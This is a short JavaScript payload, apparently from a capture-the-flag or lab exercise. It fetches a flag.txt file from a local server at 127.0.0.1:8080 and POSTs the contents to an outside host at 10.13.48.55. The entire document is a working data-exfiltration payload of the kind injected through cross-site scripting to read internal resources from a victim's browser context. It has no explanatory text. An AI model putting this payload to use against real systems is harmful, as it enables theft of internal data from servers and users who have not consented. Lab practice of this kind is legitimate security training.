function sendData(data){
	fetch("http://10.13.48.55", {
		method: "POST",
		headers: {
			"Content-Type": "application/json"
		},
		body: JSON.stringify(data)
	})
}

fetch("http://127.0.0.1:8080/flag.txt")
	.then(response => response.text())
	.then(data => {
		sendData(data)
	})